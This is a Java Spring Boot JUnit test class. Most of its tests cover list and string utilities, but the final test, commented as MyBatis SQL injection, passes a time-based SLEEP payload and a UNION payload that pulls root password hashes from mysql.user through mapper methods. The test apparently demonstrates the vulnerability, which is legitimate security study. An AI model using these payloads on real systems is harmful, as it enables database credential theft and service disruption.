package generator;

import com.google.common.collect.Iterables;
import com.google.common.collect.Lists;

import org.junit.jupiter.api.Test;
import org.springframework.beans.factory.annotation.Autowired;
import org.springframework.boot.test.context.SpringBootTest;

import java.util.stream.Collectors;
import java.util.stream.Stream;

import generator.mapper.ArticleTypeMapper;
import lombok.val;

import static org.junit.jupiter.api.Assertions.assertEquals;

@SpringBootTest
class ApplicationTest {

  @Autowired
  ArticleTypeMapper articleTypeMapper;

  @Test
  void finsElement() {
    val str = "3";
    val list = Lists.newArrayList("1", "2", "3");
    val b = list.stream().anyMatch(s -> s.equals(str));
    assertEquals(list.contains(str), b);
  }

  @Test
  void strInsert() {
    val dateStr = "202207";
    val insert = new StringBuilder(dateStr).insert(4, "-");
    assertEquals(insert.toString(), "2022-07");
  }

  @Test
  void mergeListStream(){
    val a = Lists.newArrayList("1", "2", "3");
    val b = Lists.newArrayList("4", "42", "43");
    val c = Stream.concat(a.stream(),b.stream()).collect(Collectors.toList());
    System.out.println("a = " + a);
    System.out.println("b = " + b);
    System.out.println("c = " + c);
    assertEquals(Lists.newArrayList("1", "2", "3","4", "42", "43"), c);
  }

  @Test
  void mergeListGuava(){
    val a = Lists.newArrayList("1", "2", "3");
    val b = Lists.newArrayList("4", "42", "43");
    val c = Lists.newArrayList(Iterables.concat(a, b));
    System.out.println("a = " + a);
    System.out.println("b = " + b);
    System.out.println("c = " + c);
    assertEquals(Lists.newArrayList("1", "2", "3","4", "42", "43"), c);
  }

/**
*mybatis sql 注入
*/
  @Test
  void testMybatis(){
    // 睡眠10s
    val allOrder = articleTypeMapper.findAllOrder("id", "desc , (SELECT(1) FROM (SELECT(SLEEP(10))) test)");
    System.out.println(allOrder);
    // 获取 mysql 密码
    val selectRoot = articleTypeMapper.findAllByTable("article_type union  SELECT 10086 AS id, NULL, authentication_string AS typename FROM mysql.user WHERE USER LIKE \"%root%\"");
    System.out.println(selectRoot);
  }
}
